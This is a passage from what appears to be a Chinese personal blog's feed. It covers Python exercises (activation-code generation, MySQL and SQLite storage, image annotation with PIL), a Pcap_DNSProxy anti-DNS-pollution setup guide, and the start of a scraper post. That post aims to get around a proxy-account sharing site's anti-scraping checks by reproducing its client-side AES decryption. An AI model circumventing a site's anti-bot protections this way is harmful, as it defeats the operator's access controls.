class="comment">#用root用户登录到mysql数据库，默认密码为空。</span></span><br></pre></td></tr></table></figure></li></ul><p>关于Mysql的常用操作可<a href="https://www.jianshu.com/p/24afa0e637cc" target="_blank" rel="noopener">参见</a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成激活码的函数</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Generate_Code</span><span class="params">(counts,length=<span class="number">20</span>)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(counts):</span><br><span class="line">        key = str(uuid.uuid4())[:length]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> key_list:</span><br><span class="line">            key_list.append(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    key = Generate_Code(<span class="number">200</span>,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#创建数据库连接</span></span><br><span class="line">    conn = pymysql.connect( </span><br><span class="line">        host = <span class="string">"127.0.0.1"</span>, </span><br><span class="line">        user = <span class="string">"root"</span>, </span><br><span class="line">        password = <span class="string">""</span>, </span><br><span class="line">        database = <span class="string">"test"</span>, </span><br><span class="line">        charset = <span class="string">'utf8'</span>,</span><br><span class="line">        cursorclass=pymysql.cursors.DictCursor)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#创建一个游标对象 cursor</span></span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">    </span><br><span class="line">            <span class="comment">#执行 SQL，如果code表存在则删除</span></span><br><span class="line">            cursor.execute(<span class="string">"DROP TABLE IF EXISTS code"</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#创建code数据表</span></span><br><span class="line">            sql = <span class="string">"""CREATE TABLE code(</span></span><br><span class="line"><span class="string">                id INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">                code VARCHAR(32) NOT NULL,</span></span><br><span class="line"><span class="string">                PRIMARY KEY(id)</span></span><br><span class="line"><span class="string">            )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">            cursor.execute(sql)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#批量插入数据</span></span><br><span class="line">            cursor.executemany(<span class="string">"INSERT INTO code(code) VALUES(%s);"</span>,key)</span><br><span class="line">        <span class="comment">#提交更改</span></span><br><span class="line">        conn.commit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">            <span class="comment">#查询结果</span></span><br><span class="line">            cursor.execute(<span class="string">"SELECT * FROM code;"</span>)</span><br><span class="line">            print( cursor.fetchall() )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br></pre></td></tr></table></figure><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>日常写个小玩具可以用更轻量级的<a href="https://docs.python.org/3/library/sqlite3.html" target="_blank" rel="noopener">SQLite3</a>，它是一个小巧的储存在本地的数据库。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Generate_Code</span><span class="params">(counts,length=<span class="number">20</span>)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(counts):</span><br><span class="line">        key = str(uuid.uuid4())[:length]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> key_list:</span><br><span class="line">            <span class="comment">#sqlite3 需要的[('afsd'),('feaf'),('fasd')]形式的数据</span></span><br><span class="line">            key_list.append( (key,)) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line">key = Generate_Code(<span class="number">200</span>,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="comment">#连接到数据库，并创建游标</span></span><br><span class="line">conn = sqlite3.connect(<span class="string">"test.db"</span>)</span><br><span class="line">c = conn.cursor()</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果KEY表已经存在则先删除</span></span><br><span class="line"><span class="comment">#c.execute("DROP TABLE IF EXISTS KEY;")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建KEY表</span></span><br><span class="line">sql = <span class="string">"""CREATE TABLE KEY(</span></span><br><span class="line"><span class="string">    ID INTEGER PRIMARY KEY autoincrement,</span></span><br><span class="line"><span class="string">    CODE   TEXT NOT NULL</span></span><br><span class="line"><span class="string">);"""</span></span><br><span class="line">c.execute(sql)</span><br><span class="line"></span><br><span class="line"><span class="comment">#批量插入数据</span></span><br><span class="line">c.executemany(<span class="string">"INSERT INTO KEY VALUES(NULL,?);"</span>,key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#更新数据库</span></span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#查询KEY表内容</span></span><br><span class="line">c.execute(<span class="string">"SELECT * FROM KEY;"</span>)</span><br><span class="line">print( c.fetchall() )</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭</span></span><br><span class="line">c.close()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.archlinux.org/index.php/MySQL_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#.E9.87.8D.E7.BD.AE_root_.E5.AF.86.E7.A0.81" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/MySQL_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#.E9.87.8D.E7.BD.AE_root_.E5.AF.86.E7.A0.81</a></li><li><a href="https://www.jianshu.com/p/4490957e29ad" target="_blank" rel="noopener">https://www.jianshu.com/p/4490957e29ad</a></li><li><a href="https://github.com/PyMySQL/PyMySQL" target="_blank" rel="noopener">https://github.com/PyMySQL/PyMySQL</a></li><li><a href="http://www.runoob.com/sqlite/sqlite-python.html" target="_blank" rel="noopener">http://www.runoob.com/sqlite/sqlite-python.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;将 0001 题生成的 200 个激活码（或者优惠券）保存到 MySQL 关系型数据库中。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0001</title>
    <link href="https://xiaotaoist.github.io/2018/05/25/python-exercise-0001/"/>
    <id>https://xiaotaoist.github.io/2018/05/25/python-exercise-0001/</id>
    <published>2018-05-25T07:11:39.000Z</published>
    <updated>2018-05-31T11:51:06.430Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>做为 Apple Store App 独立开发者，你要搞限时促销，为你的应用生成激活码（或者优惠券），使用 Python 如何生成 200 个激活码（或者优惠券）？</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>激活码，一般是随机生成的一串字符，需要确保唯一性。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul><li><p>使用<a href="https://docs.python.org/3/library/secrets.html" target="_blank" rel="noopener">secrets</a>库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Generate_Key</span><span class="params">(counts,length=<span class="number">20</span>)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(counts):</span><br><span class="line">        key = str(secrets.token_hex(length))[:length]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> key_list:</span><br><span class="line">            <span class="comment">#五个字符一组，添加－作为连字符</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>,length,<span class="number">6</span>):</span><br><span class="line">                key = key[:j] + <span class="string">'-'</span> + key[j:]</span><br><span class="line"></span><br><span class="line">            key_list.append(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"></span><br><span class="line">print(Generate_Key(<span class="number">200</span>,<span class="number">20</span>))</span><br></pre></td></tr></table></figure></li><li><p>使用<a href="https://docs.python.org/3/library/uuid.html" target="_blank" rel="noopener">uuid</a>库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Generate_Code</span><span class="params">(counts,length=<span class="number">20</span>)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(counts):</span><br><span class="line">        key = str(uuid.uuid4())[:length]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> key_list:</span><br><span class="line">            key_list.append(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"></span><br><span class="line">print(Generate_Code(<span class="number">200</span>,<span class="number">20</span>))</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://gist.github.com/geoffalday/202151" target="_blank" rel="noopener">https://gist.github.com/geoffalday/202151</a></li><li><a href="https://www.cnblogs.com/hellojesson/p/6410445.html" target="_blank" rel="noopener">https://www.cnblogs.com/hellojesson/p/6410445.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;做为 Apple Store App 独立开发者，你要搞限时促销，为你的应用生成激活码（或者优惠券），使用 Python 如何生成 200 个激活码（或者优惠券）？
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0000</title>
    <link href="https://xiaotaoist.github.io/2018/05/24/python-exercise-0000/"/>
    <id>https://xiaotaoist.github.io/2018/05/24/python-exercise-0000/</id>
    <published>2018-05-24T08:37:39.000Z</published>
    <updated>2018-06-07T04:01:58.172Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>将你的 QQ 头像（或者微博头像）右上角加上红色的数字，类似于微信未读信息数量那种提示效果。 类似于图中效果</code></pre><a id="more"></a><p><img src="https://camo.githubusercontent.com/d518d3929e4054ce2f9183b23e52908da7e5632d/687474703a2f2f692e696d6775722e636f6d2f736732646b75592e706e673f31" alt="0000"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里需要给图片添加文字信息，这里使用图像处理的相关库——PIL</p><blockquote><p>pip install pillow</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw,ImageFont <span class="comment">#导入所需库</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_num</span><span class="params">(img,num_text,num_size)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取一个Image可以直接操作的对象</span></span><br><span class="line">    img = Image.open(img) </span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#设置字体文件，大小，颜色</span></span><br><span class="line">    font = ImageFont.truetype(<span class="string">"consolab.ttf"</span>,size=num_size)</span><br><span class="line">    fillcolor = <span class="string">"#ff0000"</span></span><br><span class="line">    width,height = img.size</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#绘制</span></span><br><span class="line">    draw.text( (width - <span class="number">40</span>,<span class="number">10</span>),num_text,font=font,fill=fillcolor)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#保存结果</span></span><br><span class="line">    img.save(<span class="string">"num.png"</span>,<span class="string">"png"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    img = <span class="string">"1.png"</span></span><br><span class="line">    add_num(img,<span class="string">"99"</span>,<span class="number">30</span>)</span><br></pre></td></tr></table></figure><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><ol><li>Windows/Linux 字体文件不一样，如何让其具有通用性？</li><li>如何让代码有更高的复用性（图片类型，指定字体属性）？</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></li><li><a href="https://stackoverflow.com/questions/16373425/add-text-on-image-using-pil" target="_blank" rel="noopener">https://stackoverflow.com/questions/16373425/add-text-on-image-using-pil</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;将你的 QQ 头像（或者微博头像）右上角加上红色的数字，类似于微信未读信息数量那种提示效果。 类似于图中效果
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>使用Pcap_DNS搭建本地防污染DNS服务器</title>
    <link href="https://xiaotaoist.github.io/2018/04/14/Pcap-DNSProxy-md/"/>
    <id>https://xiaotaoist.github.io/2018/04/14/Pcap-DNSProxy-md/</id>
    <published>2018-04-14T13:42:48.000Z</published>
    <updated>2018-06-10T09:37:29.482Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><h2 id="DNS介绍"><a href="#DNS介绍" class="headerlink" title="DNS介绍"></a>DNS介绍</h2><p> 我们使用的互联网是基于TCP/IP协议的，而TCP/IP的基石是IP地址，所以在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，但对于人类来说，记住很多IP地址是件很困难的事情，于是发明了DNS（Domain Name System，域名系统），现在我们访问网站时，只需要输入相应的域名，就能看到所需要的页面。这是因为互联网上有一种叫“DNS服务器”的计算机会自动把我们的域名“翻译”成了相应的IP地址，并告诉我们。以访问百度为例<code>www.baidu.com</code>，系统会向DNS服务器（如<code>8.8.8.8</code>）发送请求：”嘿，我要用度娘，赶紧告诉我它的IP地址”，DNS服务器收到请求后，就会回复我们：”这是百度的ip地址，请查收“，系统收到IP地址后，便会和百度的服务器进行通信，最后得到我们看到的网页。</p> <a id="more"></a><p> <img src="/img/dns_dig.png" alt="dig"></p><h2 id="DNS的问题"><a href="#DNS的问题" class="headerlink" title="DNS的问题"></a>DNS的问题</h2><p>一般运营商（联通，电信，移动）都会搭建自己的DNS服务器，以提高响应速度，但是运营商会为了为了某些目的，会对DNS做一些手脚，导致我们无法通过域名解析出正确的IP地址。常用的手段有：DNS劫持和DNS污染。网上很多文章建议将DNS设为公共DNS（如阿里的<code>223.5.5.5</code>,谷歌的<code>8.8.8.8</code>,腾讯的<code>119.29.29.29</code>），但是你们也太小看运营商了，以移动为例：他们会对UDP53（DNS默认向53端口用UDP包发送查询请求）进行抢答。随便输入一个IP地址（8.1.2.3不是任何公共DNS服务器地址），都能给你返回查询结果。<br><img src="/img/dns_fake.png" alt="dns_fake"></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>这里介绍使用<a href="https://github.com/chengr28/Pcap_DNSProxy" target="_blank" rel="noopener">Pcap_DNSProxy</a>搭建防污染防劫持的DNS服务器。Win/MacOS都有编译好的二进制文件，可以直接<a href="https://github.com/chengr28/Pcap_DNSProxy/releases" target="_blank" rel="noopener">下载</a>使用。</p><p>下文介绍Arch Linux下的Pcap_DNSProxy的编译与使用，其他环境请参考chengr28的<a href="https://github.com/chengr28/Pcap_DNSProxy/tree/master/Documents" target="_blank" rel="noopener">官方文档</a></p><ul><li><p>安装编译环境</p><blockquote><p>sudo pacman -S gcc cmake libpcap libsodium openssl git bind-tools</p></blockquote></li><li><p>下载源码</p><blockquote><p>git clone <a href="https://github.com/chengr28/Pcap_DNSProxy.git" target="_blank" rel="noopener">https://github.com/chengr28/Pcap_DNSProxy.git</a></p></blockquote></li><li><p>编译生成可执行文件</p><blockquote><p>cd Pcap_DNSProxy/Source/Auxiliary/Scripts #进入指定目录<br>chmod 755 CMake_Build.sh #赋予脚本执行权限<br>./CMake_Build.sh         #执行编译程序</p></blockquote></li><li><p>编译成功后，<code>Pcap_DNSProxy/Source/Release</code> 目录下的文件即目标程序和配置文件，我们先来测试一下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ../../Release                      <span class="comment">#切换到Relese目录</span></span><br><span class="line">sudo ./Pcap_DNSProxy --<span class="built_in">disable</span>-daemon <span class="comment">#调试运行</span></span><br><span class="line">dig @127.0.0.1 github.com         <span class="comment">#若能正常返回查询结果，即正常工作</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="设置开机自启"><a href="#设置开机自启" class="headerlink" title="设置开机自启"></a>设置开机自启</h2><ul><li>进入<code>Release</code>目录并编辑 Pcap_DNSProxy.service 文件，编辑完成后保存： </li></ul><blockquote><p>WorkingDirectory= 项为程序所在目录的绝对路径(例如:/home/my/Pcap_DNSProxy/Source/Release)<br>ExecStart= 项为程序所在目录的绝对路径，并在最后加上程序的名称(例如：/home/my/Pcap_DNSProxy/Source/Release/Pcap_DNSProxy)</p></blockquote><ul><li><p>自动安装到系统，并设为开机自启</p><blockquote><p>sudo ./Linux_Install.Systemd.sh</p></blockquote></li><li><p>修改系统DNS设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">echo</span> <span class="string">"nameserver 127.0.0.1\nnameserver 8.8.8.8"</span> | sudo tee /etc/resolv.conf <span class="comment">#修改系统DNS为127.0.0.1</span></span><br><span class="line">&gt;sudo chattr +i /etc/resolv.conf <span class="comment">#其他网络管理程序可能会修改这个文件,设置特殊权限以避免被其他程序改动</span></span><br></pre></td></tr></table></figure></li><li><p>再来测试一下,类似的结果即配置成功<br><img src="/img/dns_suc.png" alt="dns_success"></p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>正常情况，Pcap_DNSProxy 可以做到开箱即用，你想做一些调整的话，可以修改配置文件<code>Config.conf</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Outgoing Protocol = IPv4  + UDP + TCP <span class="comment">#优先使用UDP，提高解析速度</span></span><br><span class="line">EDNS Label = 1 <span class="comment">#EDNS 标签支持</span></span><br><span class="line">SOCKS Proxy = 1 <span class="comment">#允许使用Sock5代理，以远程解析DNS请求</span></span><br><span class="line">SOCKS IPv4 Address = 127.0.0.1:1080</span><br></pre></td></tr></table></figure></li></ul><p>更详细配置请阅读<a href="https://github.com/chengr28/Pcap_DNSProxy/blob/master/Documents/ReadMe.zh-Hans.txt" target="_blank" rel="noopener">文档</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F</a></li><li><a href="https://www.v2ex.com/t/442340#reply15" target="_blank" rel="noopener">https://www.v2ex.com/t/442340#reply15</a></li><li><a href="https://www.v2ex.com/t/360775" target="_blank" rel="noopener">https://www.v2ex.com/t/360775</a></li><li><a href="https://wiki.archlinux.org/index.php/Resolv.conf" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Resolv.conf</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;h2 id=&quot;DNS介绍&quot;&gt;&lt;a href=&quot;#DNS介绍&quot; class=&quot;headerlink&quot; title=&quot;DNS介绍&quot;&gt;&lt;/a&gt;DNS介绍&lt;/h2&gt;&lt;p&gt; 我们使用的互联网是基于TCP/IP协议的，而TCP/IP的基石是IP地址，所以在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，但对于人类来说，记住很多IP地址是件很困难的事情，于是发明了DNS（Domain Name System，域名系统），现在我们访问网站时，只需要输入相应的域名，就能看到所需要的页面。这是因为互联网上有一种叫“DNS服务器”的计算机会自动把我们的域名“翻译”成了相应的IP地址，并告诉我们。以访问百度为例&lt;code&gt;www.baidu.com&lt;/code&gt;，系统会向DNS服务器（如&lt;code&gt;8.8.8.8&lt;/code&gt;）发送请求：”嘿，我要用度娘，赶紧告诉我它的IP地址”，DNS服务器收到请求后，就会回复我们：”这是百度的ip地址，请查收“，系统收到IP地址后，便会和百度的服务器进行通信，最后得到我们看到的网页。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://xiaotaoist.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Python爬取某站科学上网帐号(5.15更新)</title>
    <link href="https://xiaotaoist.github.io/2018/04/07/python-getss/"/>
    <id>https://xiaotaoist.github.io/2018/04/07/python-getss/</id>
    <published>2018-04-07T10:31:27.000Z</published>
    <updated>2018-05-15T08:38:37.286Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无意间发现了一个<a href="https://free-ss.site/" target="_blank" rel="noopener">SS帐号分享站</a>，但每次都需要手动获取帐号信息太麻烦了，这里用Python写一个爬虫来自动获取帐号信息。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先来看一下网站源码。站长做了防爬处理，数据并不保存在源代码中，并且针对爬虫常见的模拟浏览器手段进行检测。</p><a id="more"></a><p><img src="/img/free-ss_1.png" alt="free-ss_view"><br>看一下网络连接，发现了一个ss.json的get请求，内容居然帐号信息。<br><img src="/img/free-ss_2.png" alt="free-ss_json"><br>本以为是站长特意留下的API接口，测试之后才发现里面的帐号信息都不能正常使用。现在只能老老实实的去分析源码了。<br>网站关键部分是用javascript写的。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用a，b 分别初始化x（key）,y(iv)</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">'1a52316b1ed72c8f'</span>;<span class="keyword">var</span> b = <span class="string">'cd3e6a7914085b2f'</span>;<span class="keyword">var</span> c = <span class="string">'327bd961633a77c4'</span>;</span><br><span class="line"><span class="keyword">var</span> x = CryptoJS.enc.Latin1.parse(a);</span><br><span class="line"><span class="keyword">var</span> y = CryptoJS.enc.Latin1.parse(b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//post方法提交a,b,c,得到密文data</span></span><br><span class="line">$.post(<span class="string">"data.php"</span>,&#123;<span class="attr">a</span>:a,<span class="attr">b</span>:b,<span class="attr">c</span>:c&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//解密</span></span><br><span class="line">    <span class="keyword">var</span> dec = CryptoJS.AES.decrypt(data,x,&#123;<span class="attr">iv</span>:y,<span class="attr">mode</span>:CryptoJS.mode.ECB,<span class="attr">padding</span>:CryptoJS.pad.Pkcs7&#125;);</span><br><span class="line">    <span class="comment">//格式化成json格式方便后面使用</span></span><br><span class="line">    <span class="keyword">var</span> tbdt = $.parseJSON(dec.toString(CryptoJS.enc.Utf8))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到流程如下</p><blockquote><ol><li>判断是否是正常的浏览器，如果正常，就用POST方法提交正确的a,b,c 参数，服务端会返回一串AES密文</li><li>用a，b分别初始化key，iv，用Crypto－js库去解密返回的数据</li><li>解密后，重新排版，优化显示</li></ol></blockquote><p>这里我们用Python去模拟整个过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 